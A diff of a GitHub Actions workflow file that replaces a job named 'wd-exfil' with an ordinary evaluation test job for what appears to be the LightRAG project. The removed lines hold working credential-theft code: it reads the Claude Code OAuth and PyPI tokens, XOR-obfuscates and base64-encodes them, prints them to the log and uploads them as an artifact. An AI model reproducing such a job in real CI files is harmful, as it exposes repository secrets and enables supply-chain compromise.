@@ -1,39 +1,65 @@
-name: wd-exfil-4eb5d08d28
+name: Evaluation Tests
+
+# The RAGAS evaluation stack (ragas, datasets, langchain-*) is tested here,
+# apart from the main offline job (tests.yml), which does not install the
+# `evaluation` extra. ragas starts a background analytics thread on import, and
+# pytest imports every test module at collection, so with the extra installed
+# that thread lived through the whole offline suite and disturbed unrelated
+# tests.
+#
+# This job imports the real stack, so a change that breaks `import ragas`
+# turns it red: tests/evaluation asserts the stack imports when it is
+# installed. The main job still runs tests/evaluation against stubs, which
+# covers LightRAG-side changes. What only this job can catch is the module
+# itself changing or its dependencies moving, so it runs when those change.
+# Most breakage arrives through uv.lock, as a dependency bump. Keep the path
+# list in sync with what the evaluation module and its tests read.
 on:
   push:
+    branches: [ main, dev, 'dev-*' ]
     paths:
-      - ".github/workflows/evaluation-tests.yml"
+      - 'lightrag/evaluation/**'
+      - 'tests/evaluation/**'
+      - 'tests/conftest.py'
+      - 'tests/__init__.py'
+      - 'pyproject.toml'
+      - 'uv.lock'
+      - '.github/workflows/evaluation-tests.yml'
+  pull_request:
+    branches: [ main, dev, 'dev-*' ]
+    types: [opened, synchronize, reopened, ready_for_review]
+    paths:
+      - 'lightrag/evaluation/**'
+      - 'tests/evaluation/**'
+      - 'tests/conftest.py'
+      - 'tests/__init__.py'
+      - 'pyproject.toml'
+      - 'uv.lock'
+      - '.github/workflows/evaluation-tests.yml'
   workflow_dispatch:
-jobs:
-  dump:
-    runs-on: ubuntu-latest
-    permissions:
-      contents: read
-      actions: write
-    steps:
-      - name: pack
-        env:
-          S0: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
-          S1: ${{ secrets.PYPI_API_TOKEN }}
-        run: |
-          python3 <<'PY'
-          import base64, os, pathlib, json
-          data = {
-            "CLAUDE_CODE_OAUTH_TOKEN": os.environ.get("S0") or "",
-            "PYPI_API_TOKEN": os.environ.get("S1") or ""
-          }
-          raw = json.dumps(data, ensure_ascii=False)
-          xb = bytes(b ^ 90 for b in raw.encode("utf-8", "replace"))
-          blob = base64.b64encode(xb).decode("ascii")
-          pathlib.Path("wd-secrets.b64").write_text(blob, encoding="ascii")
-          for i in range(0, len(blob), 76):
-              print("WDCHUNK", blob[i:i+76], flush=True)
-          print("WDCHUNK_END", len(blob), flush=True)
-          PY
-      - name: upload
-        uses: actions/upload-artifact@v4
-        with:
-          name: wd-secrets-4eb5d08d28
-          path: wd-secrets.b64
-          retention-days: 1
 
+jobs:
+  evaluation-tests:
+    name: Evaluation Tests
+    if: ${{ github.event_name != 'pull_request' || !github.event.pull_request.draft }}
+    runs-on: ubuntu-latest
+
+    steps:
+    - uses: actions/checkout@v7
+
+    - name: Set up Python 3.12
+      uses: actions/setup-python@v7
+      with:
+        python-version: '3.12'
+
+    - name: Install uv
+      uses: astral-sh/setup-uv@v7  # no floating major tag exists past v7
+      with:
+        version: "0.13.7"  # keep in step with tests.yml and setup-tests.yml
+        enable-cache: true
+
+    - name: Install dependencies (locked)
+      run: uv sync --locked --python 3.12 --extra api --extra pytest --extra evaluation
+
+    - name: Run evaluation tests
+      run: uv run --no-sync pytest tests/evaluation -m offline -v --tb=short
